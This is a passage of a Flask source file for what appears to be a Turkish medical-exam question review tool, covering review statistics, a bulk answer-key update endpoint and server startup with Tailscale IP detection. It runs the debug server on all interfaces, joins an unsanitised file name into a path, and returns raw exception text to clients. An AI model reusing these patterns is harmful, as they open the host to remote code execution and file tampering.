            if ef is not None:
                ef_clamped = max(1.3, min(3.0, ef))
                bin_idx = int(round((ef_clamped - 1.3) / bin_size))
                if 0 <= bin_idx < len(bins):
                    label = f"{bins[bin_idx]:.2f}"
                    detailed_breakdown[label] += 1
        
        db_cursor.execute("SELECT kurul_adi, COUNT(*) FROM questions WHERE kurul_adi IS NOT NULL AND is_archived = 0 GROUP BY kurul_adi")
        kurul_counts = {row[0]: row[1] for row in db_cursor.fetchall()}
        
        db_conn.close()
        
        log_conn = database.get_log_db_connection()
        log_cursor = log_conn.cursor()
        
        log_cursor.execute("""
            SELECT old_data, new_data FROM logs 
            WHERE action_type = 'REVIEW' AND date(timestamp) = date('now')
        """)
        todays_reviews = log_cursor.fetchall()
        log_conn.close()
        
        total_reviews_today = len(todays_reviews)
        correct_reviews_today = 0
        kurul_solved_today = 0
        
        for r in todays_reviews:
            old_q = json.loads(r["old_data"]) if r["old_data"] else {}
            new_q = json.loads(r["new_data"]) if r["new_data"] else {}
            
            old_rep = old_q.get("repetitions", 0)
            new_rep = new_q.get("repetitions", 0)
            if new_rep > old_rep:
                correct_reviews_today += 1
                
            if old_q.get("kurul_adi") or new_q.get("kurul_adi"):
                if old_rep == 0:
                    kurul_solved_today += 1
                    
        success_rate_today = 0
        if total_reviews_today > 0:
            success_rate_today = round((correct_reviews_today / total_reviews_today) * 100, 1)
            
        return jsonify({
            "total_active": total_active,
            "difficulty_breakdown": {
                "hard": hard_count,
                "medium": medium_count,
                "easy": easy_count
            },
            "detailed_difficulty": detailed_breakdown,
            "kurul_breakdown": kurul_counts,
            "today": {
                "total_reviews": total_reviews_today,
                "kurul_solved": kurul_solved_today,
                "success_rate": success_rate_today
            }
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/answer-key/bulk-update", methods=["POST"])
def bulk_update_answer_key():
    try:
        import json
        data = request.json
        if not data:
            return jsonify({"error": "No data provided"}), 400
            
        required_fields = ["file_name", "yil", "exam_type", "updates"]
        for field in required_fields:
            if field not in data or data[field] is None:
                return jsonify({"error": f"Missing field: {field}"}), 400
                
        file_name = str(data["file_name"]).strip()
        yil = str(data["yil"]).strip()
        exam_type = str(data["exam_type"]).strip()
        updates = data["updates"]
        
        if not isinstance(updates, list):
            return jsonify({"error": "updates must be a list"}), 400
            
        if exam_type == "final":
            folder_path = os.path.join(app.root_path, "final soruları json format")
        else:
            folder_path = os.path.join(app.root_path, "kurul soruları json format")
            
        file_path = os.path.join(folder_path, file_name)
        if not os.path.exists(file_path):
            return jsonify({"error": "JSON file not found"}), 404
            
        # 1. Update JSON file
        with open(file_path, "r", encoding="utf-8") as f:
            questions = json.load(f)
            
        updated_in_json = 0
        updates_dict = {int(u["soru_numarasi"]): str(u["correct_option"]).strip().upper() for u in updates}
        
        for q in questions:
            if str(q.get("yil")) == str(yil):
                num = int(q.get("soru_numarasi"))
                if num in updates_dict:
                    q["cevap"] = updates_dict[num]
                    updated_in_json += 1
                    
        with open(file_path, "w", encoding="utf-8") as f:
            json.dump(questions, f, ensure_ascii=False, indent=2)
            
        # 2. Update SQLite Database
        kurul_adi = file_name.replace("sorular_", "").replace(".json", "")
        conn = database.get_db_connection()
        cursor = conn.cursor()
        
        updated_in_db = 0
        for num, correct in updates_dict.items():
            # Get old correct option for logging
            cursor.execute("""
                SELECT id, correct_option FROM questions 
                WHERE kurul_adi = ? AND yil = ? AND soru_numarasi = ?
            """, (kurul_adi, yil, num))
            row = cursor.fetchone()
            if row:
                q_id = row["id"]
                old_correct = row["correct_option"]
                if old_correct != correct:
                    cursor.execute("UPDATE questions SET correct_option = ? WHERE id = ?", (correct, q_id))
                    conn.commit()
                    updated_in_db += 1
                    
                    # Log individual correction
                    cursor.execute("SELECT * FROM questions WHERE id = ?", (q_id,))
                    new_q = dict(cursor.fetchone())
                    old_q = new_q.copy()
                    old_q["correct_option"] = old_correct
                    database.add_log('CORRECT_ANSWER', q_id, old_data=old_q, new_data=new_q)
                    
        conn.close()
        
        return jsonify({
            "status": "success",
            "message": f"Successfully updated {updated_in_json} questions in JSON and {updated_in_db} in database.",
            "updated_in_json": updated_in_json,
            "updated_in_db": updated_in_db
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    import sys
    try:
        sys.stdout.reconfigure(encoding='utf-8')
        sys.stderr.reconfigure(encoding='utf-8')
    except AttributeError:
        pass
        
    import socket
    import subprocess
    
    def get_tailscale_ip():
        try:
            # Try running tailscale CLI
            result = subprocess.run(["tailscale", "ip", "-4"], capture_output=True, text=True, timeout=2)
            if result.returncode == 0 and result.stdout.strip():
                return result.stdout.strip()
        except Exception:
            pass
            
        try:
            # Fallback: scan local interface IPs in 100.64.x.x - 100.127.x.x range
            hostname = socket.gethostname()
            for ip in socket.gethostbyname_ex(hostname)[2]:
                parts = ip.split('.')
                if len(parts) == 4 and parts[0] == '100':
                    if 64 <= int(parts[1]) <= 127:
                        return ip
        except Exception:
            pass
        return None

    print("\n" + "="*70)
    print("  🩺 TIPTA SORU TEKRAR ARACI BAŞLATILIYOR...")
    print(f"  Yerel Erişim Adresi:   http://localhost:5000")
    
    ts_ip = get_tailscale_ip()
    if ts_ip:
        print(f"  Tailscale Uzaktan Erişim Adresi: http://{ts_ip}:5000")
    else:
        print("  Tailscale aktif değil veya IP tespit edilemedi.")
        print("  Güvenli uzaktan erişim için bilgisayarınızda Tailscale uygulamasını açın.")
    print("="*70 + "\n")
    
    app.run(host="0.0.0.0", port=5000, debug=True)
